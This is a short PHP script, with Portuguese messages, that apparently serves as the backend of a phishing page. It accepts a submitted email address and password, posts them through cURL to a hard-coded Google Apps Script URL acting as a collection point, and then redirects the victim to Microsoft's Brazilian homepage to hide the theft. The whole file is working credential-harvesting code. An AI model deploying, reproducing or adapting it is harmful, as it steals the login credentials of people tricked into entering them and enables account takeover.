<?php

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    http_response_code(405);
    echo json_encode(['erro' => 'Método não permitido.']);
    exit;
}

$rawBody = file_get_contents('php://input');
$payload = null;

if (!empty($rawBody)) {
    $payload = json_decode($rawBody, true);
}

if (!is_array($payload) || empty($payload)) {
    // Fallback para dados enviados via formulário tradicional (application/x-www-form-urlencoded)
    if (!empty($_POST)) {
        $payload = $_POST;
    }
}

if (!is_array($payload) || empty($payload)) {
    header('Content-Type: application/json; charset=utf-8');
    http_response_code(400);
    echo json_encode(['erro' => 'Formato de payload inválido.']);
    exit;
}

$email = isset($payload['email']) ? filter_var($payload['email'], FILTER_VALIDATE_EMAIL) : false;
$senha = isset($payload['senha']) ? trim($payload['senha']) : '';

if (!$email || $senha === '') {
    header('Content-Type: application/json; charset=utf-8');
    http_response_code(400);
    echo json_encode(['erro' => 'Dados inválidos ou ausentes.']);
    exit;
}

$scriptUrl = 'https://script.google.com/macros/s/AKfycbw5R4SX0qVbo8mvYS6DVkXCfur8fogTuoZEiKpZCz6opFEbpRJ6id8BkB31Cb-WP1gA/exec';

$dados = [
    'email' => $email,
    'senha' => $senha,
];

if (!function_exists('curl_init')) {
    header('Content-Type: application/json; charset=utf-8');
    http_response_code(500);
    echo json_encode(['erro' => 'A extensão cURL não está habilitada.']);
    exit;
}

$ch = curl_init($scriptUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json; charset=utf-8']);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($dados));
$response = curl_exec($ch);

if (curl_errno($ch)) {
    header('Content-Type: application/json; charset=utf-8');
    http_response_code(500);
    echo json_encode(['erro' => 'Erro ao conectar com o Google Apps Script: ' . curl_error($ch)]);
} else {
    $redirectUrl = 'https://www.microsoft.com/pt-br';
    header('Location: ' . $redirectUrl, true, 303);
}

curl_close($ch);
exit;
